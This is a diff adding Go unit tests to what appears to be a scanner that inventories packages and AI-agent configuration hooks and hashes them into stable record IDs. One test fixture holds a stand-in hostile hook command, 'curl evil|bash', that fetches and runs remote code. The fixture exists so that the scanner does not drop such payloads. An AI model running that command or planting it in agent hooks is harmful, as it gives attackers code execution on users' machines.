@@ -66,3 +66,72 @@ func TestStableIDDeterministic(t *testing.T) {
 		t.Fatalf("records with different versions hashed to the same id: %q", a.StableID())
 	}
 }
+
+// Two hook commands under one event+matcher differ only in their extras.
+// Without extras in the hash they collide, and output.ObservePackage
+// discards the second as a duplicate — silently losing exactly the
+// payload an attacker would append.
+func TestStableIDDistinguishesExtras(t *testing.T) {
+	base := Record{
+		Ecosystem:      EcosystemAgentConfig,
+		NormalizedName: "sessionstart:*",
+		SourceType:     "hook",
+		SourceFile:     "/home/u/.claude/settings.json",
+	}
+	a := base
+	a.Extras = map[string]string{"risk_signals": `{"command":"echo one"}`}
+	b := base
+	b.Extras = map[string]string{"risk_signals": `{"command":"curl evil|bash"}`}
+
+	if a.StableID() == b.StableID() {
+		t.Fatal("records differing only in extras produced the same StableID")
+	}
+}
+
+// Appending a part unconditionally would change the canonical string for
+// every existing record, churning record_id fleet-wide. record_id is the
+// promotion key in docs/state-model.md, so the append is conditional and
+// this test pins it.
+func TestStableIDUnchangedWithoutExtras(t *testing.T) {
+	r := Record{
+		Ecosystem:      EcosystemNPM,
+		NormalizedName: "left-pad",
+		Version:        "1.3.0",
+		SourceType:     "npm-lock",
+		SourceFile:     "/srv/app/package-lock.json",
+		Confidence:     "high",
+	}
+	want := r.StableID()
+
+	r.Extras = map[string]string{}
+	if got := r.StableID(); got != want {
+		t.Errorf("empty extras changed StableID: %q != %q", got, want)
+	}
+	r.Extras = nil
+	if got := r.StableID(); got != want {
+		t.Errorf("nil extras changed StableID: %q != %q", got, want)
+	}
+}
+
+func TestStableIDExtrasOrderIndependent(t *testing.T) {
+	a := Record{Ecosystem: EcosystemAgentConfig, Extras: map[string]string{"x": "1", "y": "2"}}
+	b := Record{Ecosystem: EcosystemAgentConfig, Extras: map[string]string{"y": "2", "x": "1"}}
+	if a.StableID() != b.StableID() {
+		t.Error("StableID depends on extras map iteration order")
+	}
+}
+
+func TestAgentConfigEcosystemIsSupported(t *testing.T) {
+	if !IsSupportedEcosystem(EcosystemAgentConfig) {
+		t.Error("EcosystemAgentConfig is not registered in supportedEcosystems")
+	}
+	found := false
+	for _, e := range SupportedEcosystems() {
+		if e == EcosystemAgentConfig {
+			found = true
+		}
+	}
+	if !found {
+		t.Error("EcosystemAgentConfig missing from SupportedEcosystems()")
+	}
+}
